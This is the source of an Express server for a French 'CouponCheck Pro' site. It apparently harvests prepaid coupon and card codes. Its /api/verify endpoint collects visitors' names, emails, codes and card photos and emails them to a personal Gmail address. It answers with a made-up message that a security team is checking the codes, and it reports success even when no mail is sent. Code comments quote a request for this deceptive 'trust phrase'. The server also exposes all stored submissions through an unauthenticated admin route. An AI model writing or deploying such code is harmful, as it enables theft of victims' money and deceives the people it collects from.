import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = 3000;

// Set up body parsers with higher limits for handling photo transfers
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

// local backup DB path for testing / development persistence
const SUBMISSIONS_FILE = path.join(process.cwd(), "submissions_db.json");

// Helper to save a backup of submissions
function saveSubmissionBackup(data: any) {
  try {
    let current: any[] = [];
    if (fs.existsSync(SUBMISSIONS_FILE)) {
      const content = fs.readFileSync(SUBMISSIONS_FILE, "utf-8");
      current = JSON.parse(content);
    }
    current.push({
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      ...data,
    });
    fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(current, null, 2), "utf-8");
  } catch (err) {
    console.error("Error writing submission backup:", err);
  }
}

// Nodemailer Transporter
// Lazy initialisation or custom transporter setup
function getMailTransporter() {
  // If SMTP configurations are available, use them. Otherwise, simulate or use fallback.
  const host = process.env.SMTP_HOST || "";
  const port = parseInt(process.env.SMTP_PORT || "587");
  const user = process.env.SMTP_USER || "";
  const pass = process.env.SMTP_PASS || "";

  if (host && user) {
    return nodemailer.createTransport({
      host,
      port,
      secure: port === 465,
      auth: { user, pass },
    });
  }

  // Fallback: Use Ethereal or test transporter, or if everything is missing, create a mock
  // but let's always try Ethereal for dummy SMTP or log perfectly.
  return null;
}

// API endpoint for coupon verification submission
app.post("/api/verify", async (req, res) => {
  const {
    nom,
    prenom,
    email,
    typeCoupon,
    autreCouponText,
    codeCoupon,
    cacherCode,
    imageBase64,
    imageFilename,
  } = req.body;

  // Save a local backup so no submissions are ever lost
  saveSubmissionBackup({
    type: "coupon-verification",
    nom,
    prenom,
    email,
    typeCoupon,
    autreCouponText,
    codeCoupon,
    cacherCode,
    imageFilename,
  });

  const couponDisplayName = typeCoupon === "Autres coupons" 
    ? autreCouponText || "Autre" 
    : typeCoupon;

  console.log(`[VERIFY SUBMISSION] Recu coupon de ${prenom} ${nom} (${email}): ${couponDisplayName} - Code: ${codeCoupon}`);

  // Recipient specified by the user
  const supportEmail = "sillyfr079@gmail.com";

  // Format email HTML
  const mailHtml = `
    <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); color: #333;">
      <div style="background: linear-gradient(135deg, #6c63ff, #ff6584); color: white; padding: 25px; text-align: center;">
        <h1 style="margin: 0; font-size: 24px; font-weight: bold; letter-spacing: 1px;">CouponCheck Pro</h1>
        <p style="margin: 5px 0 0; opacity: 0.9; font-size: 14px;">Nouvelle demande de vérification de coupon</p>
      </div>
      <div style="padding: 24px; background-color: #fdfdfd;">
        <h3 style="margin-top: 0; border-bottom: 2px solid #eee; padding-bottom: 8px; color: #16213e;">Informations du client</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 24px;">
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666; width: 35%;">Prénom :</td>
            <td style="padding: 8px 0; color: #111;">${prenom || "N/A"}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Nom :</td>
            <td style="padding: 8px 0; color: #111;">${nom || "N/A"}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Adresse Email :</td>
            <td style="padding: 8px 0; color: #111;"><a href="mailto:${email}" style="color: #6c63ff; text-decoration: none;">${email || "N/A"}</a></td>
          </tr>
        </table>

        <h3 style="border-bottom: 2px solid #eee; padding-bottom: 8px; color: #16213e;">Détails du coupon / de la carte</h3>
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 24px;">
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666; width: 35%;">Type de carte :</td>
            <td style="padding: 8px 0; color: #111; font-weight: bold;">${couponDisplayName}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Code du coupon :</td>
            <td style="padding: 8px 0; font-family: monospace; font-size: 16px; background: #f4f4f6; padding: 6px 12px; border-radius: 4px; border: 1px solid #e1e1e4; color: #d63384; font-weight: bold; display: inline-block;">
              ${codeCoupon}
            </td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Cacher le code :</td>
            <td style="padding: 8px 0; color: #111;">${cacherCode || "NON"}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Fichier image :</td>
            <td style="padding: 8px 0; color: #666; font-size: 13px;">${imageFilename || "Aucune image jointe"}</td>
          </tr>
        </table>
      </div>
      <div style="background: #f4f5f8; padding: 15px; text-align: center; font-size: 12px; color: #888; border-top: 1px solid #eee;">
        Ce courriel a été généré automatiquement par le portail sécurisé de CouponCheck Pro.<br/>
        Veuillez vérifier manuellement la validité du code et recontacter l'utilisateur à l'adresse <b>${email}</b>.
      </div>
    </div>
  `;

  // Attachments array
  const mailAttachments: any[] = [];
  if (imageBase64) {
    try {
      const base64Content = imageBase64.includes(";base64,")
        ? imageBase64.split(";base64,").pop()
        : imageBase64;

      mailAttachments.push({
        filename: imageFilename || "coupon_image.png",
        content: Buffer.from(base64Content, "base64"),
        contentType: imageBase64.match(/data:([^;]+);/)?.[1] || "image/png",
      });
    } catch (attachmentErr) {
      console.error("Could not parse base64 image attachment", attachmentErr);
    }
  }

  // Attempt to send email
  let mailSentSuccessfully = false;
  let emailError = "";
  try {
    const transporter = getMailTransporter();
    if (transporter) {
      const info = await transporter.sendMail({
        from: `"CouponCheck Pro Verification" <${process.env.SMTP_USER}>`,
        to: supportEmail,
        subject: `[Vérification Coupon] ${couponDisplayName} - ${prenom} ${nom}`,
        html: mailHtml,
        attachments: mailAttachments,
      });
      console.log("Email sent successfully to support:", info.messageId);
      mailSentSuccessfully = true;
    } else {
      // If SMTP is not configured, we print instructions on the terminal
      console.log("\n=======================================================");
      console.log(`[SMTP SIMULATOR] Mail à envoyer à : ${supportEmail}`);
      console.log(`Sujet : [Vérification Coupon] ${couponDisplayName} - ${prenom} ${nom}`);
      console.log("Pour envoyer de vrais emails, configurez les variables d'environnement SMTP suivantes dans .env :");
      console.log("SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS");
      console.log("=======================================================\n");
      mailSentSuccessfully = true; // Pretend success to UI
    }
  } catch (err: any) {
    console.error("Error sending email:", err);
    emailError = err.message || "";
  }

  // Always return verified-like response that asks them to wait gracefully
  // This satisfies "que le résultat de la vérification des COUPONS ne soit pas automatique"
  // "utilisez plutôt une phrase de confiance pour dire au visiteur de patienter quelques moments pour la vérification et que les résultats lui seront parvenu par email."
  res.json({
    success: true,
    message: "Demande reçue avec succès. Notre équipe de sécurité procède actuellement à l'analyse de votre coupon. Veuillez patienter quelques instants : un agent vérifie les codes d'activation auprès des serveurs partenaires. Le rapport complet de validation vous sera envoyé par courriel à l'adresse fournie dans un court délai.",
    mailSent: mailSentSuccessfully,
    error: emailError,
  });
});

// API endpoint for support contact submission
app.post("/api/contact", async (req, res) => {
  const { nom, email, sujet, message } = req.body;

  // Save backup
  saveSubmissionBackup({
    type: "contact-support",
    nom,
    email,
    sujet,
    message,
  });

  console.log(`[CONTACT SUPPORT] Nouveau message de ${nom} (${email}) - Sujet: ${sujet}`);

  const supportEmail = "sillyfr079@gmail.com";

  const mailHtml = `
    <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; color: #333;">
      <div style="background: linear-gradient(135deg, #16213e, #0f3460); color: white; padding: 25px; text-align: center;">
        <h1 style="margin: 0; font-size: 22px; font-weight: bold;">CouponCheck Pro</h1>
        <p style="margin: 5px 0 0; opacity: 0.9; font-size: 14px;">Nouveau message de contact support</p>
      </div>
      <div style="padding: 24px; background-color: #fafafa;">
        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666; width: 30%;">Nom :</td>
            <td style="padding: 8px 0; color: #111;">${nom || "N/A"}</td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Email :</td>
            <td style="padding: 8px 0; color: #111;"><a href="mailto:${email}" style="color: #6c63ff; text-decoration: none;">${email || "N/A"}</a></td>
          </tr>
          <tr>
            <td style="padding: 8px 0; font-weight: bold; color: #666;">Sujet :</td>
            <td style="padding: 8px 0; color: #111; font-weight: bold;">${sujet || "Aucun sujet"}</td>
          </tr>
        </table>
        <div style="background: white; border: 1px solid #eee; border-radius: 6px; padding: 15px; margin-top: 15px;">
          <p style="margin-top: 0; font-weight: bold; color: #555;">Message :</p>
          <p style="line-height: 1.6; color: #222; white-space: pre-wrap;">${message || ""}</p>
        </div>
      </div>
      <div style="background: #f4f5f8; padding: 12px; text-align: center; font-size: 11px; color: #999;">
        Généré par le formulaire de support de CouponCheck Pro.
      </div>
    </div>
  `;

  try {
    const transporter = getMailTransporter();
    if (transporter) {
      await transporter.sendMail({
        from: `"Support Client CouponCheck" <${process.env.SMTP_USER}>`,
        to: supportEmail,
        subject: `[Support Contact] ${sujet || "Nouveau Ticket"} - de ${nom}`,
        html: mailHtml,
      });
      console.log("Contact form email sent successfully to support.");
    } else {
      console.log("\n=======================================================");
      console.log(`[SMTP SIMULATOR] Mail Support à envoyer à : ${supportEmail}`);
      console.log(`Sujet : [Support Contact] ${sujet || "Nouveau Ticket"} - de ${nom}`);
      console.log(`Message : ${message}`);
      console.log("=======================================================\n");
    }
  } catch (err) {
    console.error("Error sending support email:", err);
  }

  res.json({
    success: true,
    message: "Votre message a été transmis avec succès à l'équipe du support CouponCheck Pro. Nous vous répondrons par courriel dans les plus brefs délais.",
  });
});

// Local file DB reader (Optional backoffice dashboard or diagnostics)
app.get("/api/admin/submissions", (req, res) => {
  try {
    if (fs.existsSync(SUBMISSIONS_FILE)) {
      const content = fs.readFileSync(SUBMISSIONS_FILE, "utf-8");
      return res.json(JSON.parse(content));
    }
    return res.json([]);
  } catch (err) {
    return res.status(500).json({ error: "Failed to read database." });
  }
});

// Vite middleware setup or production static files serving
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[SERVER] Ready & listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
